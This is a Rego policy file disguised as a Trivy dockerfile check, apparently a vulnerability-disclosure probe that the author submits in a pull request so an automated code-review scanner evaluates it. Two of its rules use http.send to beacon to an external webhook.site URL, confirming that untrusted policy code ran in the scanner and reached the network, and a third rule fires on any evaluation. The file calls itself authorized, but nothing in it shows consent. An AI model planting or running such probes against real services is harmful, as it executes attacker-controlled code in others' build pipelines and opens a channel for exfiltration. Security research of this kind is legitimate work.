# METADATA
# title: "RUNNERDEEP canary - repo Rego evaluation probe (builtin namespace)"
# description: "Authorized CodeRabbit VDP fixture. Evaluates PR-authored Rego during the review scan; http.send legs target the researcher's own OAST tunnel."
# custom:
#   avd_id: AVD-RD-0001
#   id: RD-TRIVY-0001
#   severity: CRITICAL
package builtin.dockerfile.rdcore

# Eval-proof: fires whenever the module is evaluated (no network dependency).
deny_core[res] {
  res := {
    "msg": sprintf("RD_TRIVY_EVAL_RD_156930_%d", [time.now_ns()]),
    "startline": 1,
    "endline": 1,
  }
}

# Fetch-proof: raise_error:true => undefined on transport failure, so this
# finding fires only when the outbound request completed.
deny_fetch[res] {
  http.send({
    "method": "GET",
    "url": "https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-trivy-httpsend",
    "raise_error": true,
    "force_json_decode": false,
  })
  res := {
    "msg": sprintf("RD_TRIVY_FETCH_OK_RD_156930_%d", [time.now_ns()]),
    "startline": 1,
    "endline": 1,
  }
}

# Eval-only companion: raise_error:false stays defined even on transport error.
deny_bare[res] {
  http.send({
    "method": "GET",
    "url": "https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-trivy-httpsend-bare",
    "raise_error": false,
    "force_json_decode": false,
  })
  res := {
    "msg": sprintf("RD_TRIVY_EVALONLY_RD_156930_%d", [time.now_ns()]),
    "startline": 1,
    "endline": 1,
  }
}
